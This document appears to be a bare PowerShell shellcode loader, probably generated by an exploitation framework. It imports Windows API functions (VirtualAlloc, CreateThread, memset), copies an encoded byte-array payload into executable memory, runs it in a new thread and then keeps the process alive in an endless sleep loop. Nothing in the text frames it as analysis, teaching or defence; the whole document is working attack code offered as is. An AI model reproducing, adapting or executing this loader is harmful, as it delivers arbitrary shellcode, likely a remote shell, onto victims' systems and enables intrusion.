
$MIk = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $MIk -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xd0,0xd9,0x74,0x24,0xf4,0xbb,0x6f,0xd2,0xba,0xf8,0x5e,0x31,0xc9,0xb1,0x47,0x83,0xee,0xfc,0x31,0x5e,0x14,0x03,0x5e,0x7b,0x30,0x4f,0x04,0x6b,0x36,0xb0,0xf5,0x6b,0x57,0x38,0x10,0x5a,0x57,0x5e,0x50,0xcc,0x67,0x14,0x34,0xe0,0x0c,0x78,0xad,0x73,0x60,0x55,0xc2,0x34,0xcf,0x83,0xed,0xc5,0x7c,0xf7,0x6c,0x45,0x7f,0x24,0x4f,0x74,0xb0,0x39,0x8e,0xb1,0xad,0xb0,0xc2,0x6a,0xb9,0x67,0xf3,0x1f,0xf7,0xbb,0x78,0x53,0x19,0xbc,0x9d,0x23,0x18,0xed,0x33,0x38,0x43,0x2d,0xb5,0xed,0xff,0x64,0xad,0xf2,0x3a,0x3e,0x46,0xc0,0xb1,0xc1,0x8e,0x19,0x39,0x6d,0xef,0x96,0xc8,0x6f,0x37,0x10,0x33,0x1a,0x41,0x63,0xce,0x1d,0x96,0x1e,0x14,0xab,0x0d,0xb8,0xdf,0x0b,0xea,0x39,0x33,0xcd,0x79,0x35,0xf8,0x99,0x26,0x59,0xff,0x4e,0x5d,0x65,0x74,0x71,0xb2,0xec,0xce,0x56,0x16,0xb5,0x95,0xf7,0x0f,0x13,0x7b,0x07,0x4f,0xfc,0x24,0xad,0x1b,0x10,0x30,0xdc,0x41,0x7c,0xf5,0xed,0x79,0x7c,0x91,0x66,0x09,0x4e,0x3e,0xdd,0x85,0xe2,0xb7,0xfb,0x52,0x05,0xe2,0xbc,0xcd,0xf8,0x0d,0xbd,0xc4,0x3e,0x59,0xed,0x7e,0x97,0xe2,0x66,0x7f,0x18,0x37,0x12,0x7a,0x8e,0x78,0x4b,0x8e,0xcf,0x11,0x8e,0x8f,0xce,0x5d,0x07,0x69,0x80,0xcd,0x48,0x26,0x60,0xbe,0x28,0x96,0x08,0xd4,0xa6,0xc9,0x28,0xd7,0x6c,0x62,0xc2,0x38,0xd9,0xda,0x7a,0xa0,0x40,0x90,0x1b,0x2d,0x5f,0xdc,0x1b,0xa5,0x6c,0x20,0xd5,0x4e,0x18,0x32,0x81,0xbe,0x57,0x68,0x07,0xc0,0x4d,0x07,0xa7,0x54,0x6a,0x8e,0xf0,0xc0,0x70,0xf7,0x36,0x4f,0x8a,0xd2,0x4d,0x46,0x1e,0x9d,0x39,0xa7,0xce,0x1d,0xb9,0xf1,0x84,0x1d,0xd1,0xa5,0xfc,0x4d,0xc4,0xa9,0x28,0xe2,0x55,0x3c,0xd3,0x53,0x0a,0x97,0xbb,0x59,0x75,0xdf,0x63,0xa1,0x50,0xe1,0x58,0x74,0x9c,0x97,0xb0,0x44;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$S33=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($S33.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$S33,0,0,0);for (;;){Start-sleep 60};

